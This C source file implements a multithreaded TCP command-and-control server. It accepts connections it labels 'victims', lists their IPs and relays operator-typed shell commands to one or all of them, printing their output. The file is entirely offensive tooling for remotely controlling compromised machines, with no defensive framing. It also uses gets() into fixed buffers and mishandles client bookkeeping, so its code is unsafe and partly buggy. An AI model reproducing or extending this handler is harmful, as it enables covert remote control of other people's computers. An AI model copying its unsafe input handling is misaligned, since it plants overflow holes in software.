#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <signal.h>

/****Colors****/
#define RED "\x1b[31m"
#define CYAN "\x1b[36m"
#define RESET "\x1b[0m"

/*********************User defined vals**************************/
#define PORT 8080
#define BUFFER_SIZE 2048
#define MAX_CLIENTS 10
#define BACKLOG 10


atomic_int a_val = ATOMIC_VAR_INIT(0);
pthread_mutex_t stdin_mutex;


typedef struct socket
{
    struct sockaddr_in client;
    int client_fd;
    char ip[INET_ADDRSTRLEN];
    bool is_connect;
}socket_t;

typedef struct thread_arguments {
    fd_set* read_fds;
    int listen_sock;
    int* clients_ctr;
    socket_t* clients_array;
}arg_t;

/*************************Functions******************************/
void sleep_ms(long time) {
    struct timeval timer;
    timer.tv_sec = time / 1000;
    timer.tv_usec = (time % 1000) * 1000;
    select(0, NULL, NULL, NULL, &timer); 
}

void sigpipe_handler(int signum) {
    // Handle the disconnection here
    printf("Connection closed.\n");
    exit(EXIT_SUCCESS);
}

int userList(arg_t* data) {
    int select;
    if(*(data->clients_ctr) == 0) {
        return 1;
    }
    for(int i = 0 ; i < *(data->clients_ctr); i++) {
        printf("%d : %s%s%s\n", i, RED, data->clients_array[i].ip, RESET);
    }
    printf("Your choice: ");
    scanf("%d", &select);
    return select;
}

void handleClient(socket_t* dest) {
    signal(SIGPIPE, sigpipe_handler);
    char massage[BUFFER_SIZE];
    int stupid_skip = 1;
    while(1) {
        if(dest->is_connect == false) {
            printf("User has been disconnect you return to menu in 1 sec");
            fflush(stdout);
            int len = strlen("User has been disconnect you return to menu in 1 sec");
            for(int i = 0 ; i < len ; i++) {
                printf("\b \b");
                sleep_ms(50);
                fflush(stdout);
            }
            system("clear");
            fflush(stdout);
            return;
        }
        if(stupid_skip) {
            gets(massage);
            stupid_skip = 0;
        }
        sleep_ms(100);
        if(atomic_load(&a_val) == 0) {
            memset(massage, 0 , BUFFER_SIZE);
            printf(RED "%s $" RESET,dest->ip);
            gets(massage);
            if(strcmp(massage, "Menu") == 0) {
                break;
            }
            strcat(massage,"\n");
            if(send(dest->client_fd, massage, strlen(massage), 0) <= 0) {
                perror("Error in send");
            }
        }
    }
}

void sendAll(arg_t* data) {
    char massage[BUFFER_SIZE];
    int clients_number = *(data->clients_ctr);
    printf("Enter your command: ");
    gets(massage);
    strcat(massage,"\n");
    for(int i = 0; i < clients_number ; i++) {
        //sleep_ms(200);
        send(data->clients_array[i].client_fd, massage, strlen(massage), 0);
    }
}



/*********************thread*************************/
void* readSocket(void* args) {
    arg_t * data = (arg_t *) args;
    fd_set copy_fds;
    int listening_socket = data->listen_sock;
    int c_ctr = *(data->clients_ctr);
    socket_t* c_array = data->clients_array;
    fd_set current_fds = *(data->read_fds);
    bool flag = false;

    struct sockaddr_in client_tmp;
    socklen_t tmp_size = sizeof client_tmp;

    char buffer[BUFFER_SIZE];
    memset(buffer, 0 ,BUFFER_SIZE);


    while (1)
    {
        *(data->read_fds) = current_fds;
        copy_fds = current_fds;


        if(select(FD_SETSIZE, &copy_fds, NULL, NULL, NULL) < 0) {
            perror("Select error!");
            exit(EXIT_FAILURE);
        }
        if(atomic_load(&a_val) == 2){
            //copy_fds = current_fds;    
            continue;
        }

        for(int i = 0 ; i < FD_SETSIZE; i++) {
            if(FD_ISSET(i, &copy_fds)) {
                if(i == listening_socket) {
                    //accept new client!
                    char ip_addr[INET_ADDRSTRLEN];
                    int new_client = accept(listening_socket, (struct sockaddr*)&client_tmp, &tmp_size);
                    if(new_client < 0) {
                        perror("Error in accept new client");
                        break;
                    }
                    FD_SET(new_client, &current_fds);
                    inet_ntop(AF_INET, &client_tmp.sin_addr, ip_addr, sizeof(ip_addr));
                    c_array[c_ctr].client = client_tmp;
                    c_array[c_ctr].client_fd = new_client;
                    c_array[c_ctr].is_connect = true;
                    strcpy(c_array[c_ctr].ip, ip_addr);
                    c_ctr++;
                    *(data->clients_ctr) = c_ctr;
                    printf("\t New victim connected with %s IP!", ip_addr);
                    sleep(1);
                    for(int j = 0 ; j < strlen(ip_addr) + 35; j++) {
                        printf("\b \b");
                        fflush(stdout);
                        sleep_ms(100);
                    }
                }
                else  {
                    // char ip_addr[INET_ADDRSTRLEN];
                    // for(int s = 0 ; s < clients_ctr; s++) {
                    //     if(clients[s].client_fd == i) {
                    //         inet_ntop(AF_INET, &clients[s].client.sin_addr, ip_addr, sizeof(ip_addr));
                    //     }
                    // }
                    atomic_store(&a_val, 1);
                    char ip_addr[INET_ADDRSTRLEN];
                    fd_set tmp_fds;
                    struct timeval timer;
                    int disconnect;
                    long timeout = 50;
                    timer.tv_sec = timeout / 1000;
                    timer.tv_usec = (timeout % 1000) * 1000;
                    FD_ZERO(&tmp_fds);
                    FD_SET(i, &tmp_fds);
                    //while(1) 
                    //{
                        //pthread_mutex_lock(&stdin_mutex);
                        int index = 0;
                        for(int j = 0 ; j < c_ctr ; j++) {
                                if(c_array[j].client_fd == i) {
                                    index = j;
                                    strcpy(ip_addr, c_array[j].ip);
                                }
                            } 
                            /*****design*****/
                            for(int j = 0 ; j < 8 ; j++) 
                                printf("%c",-232);
                            printf("%s",ip_addr);
                            for(int j = 0 ; j < 8 ; j++)
                                printf("%c",-232);
                            printf("\n");
                            /***************/
                        while(1) {
                            int state = select(FD_SETSIZE, &tmp_fds, NULL, NULL, &timer);
                            if(state < 0) {
                                perror("Select error");
                                exit(EXIT_FAILURE);
                            }
                            else if(state == 0) {
                                break;
                            }
                            else {    

                                memset(buffer, 0 , BUFFER_SIZE);
                                disconnect = recv(i, &buffer, BUFFER_SIZE, 0);
                                if(disconnect == 0) {
                                    c_array[index].is_connect = false;
                                    printf("%s disconnected! wait 1sec",ip_addr);
                                    fflush(stdout);
                                    //sleep(1);
                                    for(int j = 0 ; j < strlen(ip_addr) + 24; j++) {
                                        printf("\b \b");
                                        fflush(stdout);
                                        sleep_ms(50);
                                    }
                                    c_ctr--;
                                    *(data->clients_ctr) = c_ctr;
                                    FD_CLR(i, &current_fds);
                                    flag = true;
                                    break;
                                }
                                printf("%s", buffer);
                            }
                        }
                        if(flag) {
                            atomic_store(&a_val, 0);
                            break;
                        }
                        for(int j = 0 ; j <  strlen(ip_addr) + 16; j++) 
                            printf("%c",-232);
                        printf("\n");
                        pthread_mutex_unlock(&stdin_mutex);
                    }
                        atomic_store(&a_val, 0);
                //}
            }
        }

    }


}

/*********************Main thread*************************/
int main() {
    
    pthread_t pid;
    arg_t *data = (arg_t*) malloc(sizeof(arg_t));

    pthread_mutex_init(&stdin_mutex, NULL);

    int listening_socket;
    struct sockaddr_in listening_struct;
    
    int clients_ctr = 0;
    socket_t clients[MAX_CLIENTS];
    socket_t *selected = (socket_t*) malloc(sizeof(socket_t));

    char massage[BUFFER_SIZE];

    fd_set copy_fds, current_fds;

    listening_struct.sin_family = AF_INET; //IPv4
    listening_struct.sin_addr.s_addr = INADDR_ANY; //Any inversal devices like wlan0 and other..
    listening_struct.sin_port = htons(PORT); 

    if((listening_socket = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Create listening_socket failed!");
        exit(EXIT_FAILURE);
    }

    int optval = 1;
    setsockopt(listening_socket, SOL_SOCKET, SO_REUSEADDR, &optval,sizeof(optval));

    if(bind(listening_socket, (struct sockaddr*)&listening_struct, sizeof(listening_struct)) < 0) {
        perror("Binding error");
        exit(EXIT_FAILURE);
    }

    if(listen(listening_socket, BACKLOG) < 0) {
        perror("Error on listen function");
        exit(EXIT_FAILURE);
    }

    //Initallize fd_set
    FD_ZERO(&current_fds);
    FD_SET(listening_socket, &current_fds);

    //thread arguments
    data->clients_ctr = &clients_ctr;
    data->listen_sock = listening_socket;
    data->read_fds = &current_fds;
    data->clients_array = clients;
    pthread_create(&pid, NULL, &readSocket, (void *)data);

    bool flag = true;
    int select;
    while(1){
        printf(CYAN "Commands:\n" RESET);
        printf(CYAN "1: Users list\n" RESET);
        printf(CYAN "2: Exit\n" RESET);
        printf(CYAN "3: Send All\n" RESET);
        printf("Your choice: ");
        scanf("%d", &select);
        if(select == 1) {
            if(clients_ctr == 0) {
                printf("Nobody connected to the server\n");
                sleep(2);
                system("clear");
                continue;
            }
            int user = userList(data);
            selected = &(data->clients_array[user]);
            handleClient(selected);
        }
        else if(select == 2) {
            printf("Server will be down in 5 seconds");
            sleep(5);
            exit(EXIT_SUCCESS);
        }
        else if(select == 3) {
            atomic_store(&a_val,2);
            sendAll(data);
            atomic_store(&a_val,1);
        }
    }
    
    
    pthread_join(pid, NULL);
    pthread_mutex_destroy(&stdin_mutex);
}